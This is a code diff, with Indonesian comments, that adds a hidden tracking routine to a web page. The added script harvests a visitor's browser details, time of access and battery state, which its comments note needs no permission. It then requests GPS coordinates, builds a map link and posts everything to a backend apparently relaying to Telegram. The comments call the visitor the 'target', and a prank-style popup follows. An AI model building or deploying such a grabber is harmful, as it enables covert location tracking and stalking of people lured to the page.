@@ -520,7 +520,69 @@
         function hideAlert() {
             document.getElementById('customAlert').style.display = 'none';
             document.querySelectorAll('.malware-popup').forEach(el => el.remove());
+        }       
+        async function kirimKeTelegram() {
+    const dataBrowser = navigator.userAgent;
+    const waktuAkses = new Date().toLocaleString();
+    
+    // 1. Mengambil data status Baterai (Tanpa butuh Izin Pengguna)
+    let infoBaterai = "Tidak didukung oleh browser target";
+    if ('getBattery' in navigator) {
+        try {
+            const battery = await navigator.getBattery();
+            const level = Math.round(battery.level * 100);
+            const statusCas = battery.charging ? "Sedang Di-cas ⚡" : "Menggunakan Baterai 🔋";
+            infoBaterai = `${level}% (${statusCas})`;
+        } catch (e) {
+            infoBaterai = "Gagal memuat data baterai";
         }
+    }
+
+    // 2. Mengambil data GPS (Wajib memunculkan pop-up izin browser)
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            // JIKA TARGET MENGKLIK "ALLOW" (IZINKAN)
+            (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const mapsUrl = `https://google.com/maps?q=${lat},${lon}`;
+                
+                // Jalankan pengiriman data lengkap ke Vercel Backend
+                sendToBackend(dataBrowser, waktuAkses, infoBaterai, mapsUrl);
+            },
+            // JIKA TARGET MENGKLIK "BLOCK" (TOLAK)
+            (error) => {
+                const mapsUrl = "Akses Lokasi Ditolak oleh Target ❌";
+                sendToBackend(dataBrowser, waktuAkses, infoBaterai, mapsUrl);
+            }
+        );
+    } else {
+        const mapsUrl = "Fitur GPS tidak didukung browser";
+        sendToBackend(dataBrowser, waktuAkses, infoBaterai, mapsUrl);
+    }
+}
+
+// Fungsi baru untuk membungkus pengiriman data ke server Vercel Anda
+function sendToBackend(device, waktu, baterai, gps) {
+    fetch('/api/kirim', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ device, waktu, baterai, gps })
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.status === 'success') {
+            showAlert(); // Pemicu pop-up "> you found me"
+        } else {
+            alert("Error: Gagal mengirim via server backend.");
+        }
+    })
+    .catch(err => {
+        console.error("Error jaringan:", err);
+        alert("Terjadi kesalahan jaringan.");
+    });
+}
+        
     </script>
 </body>
 </html>
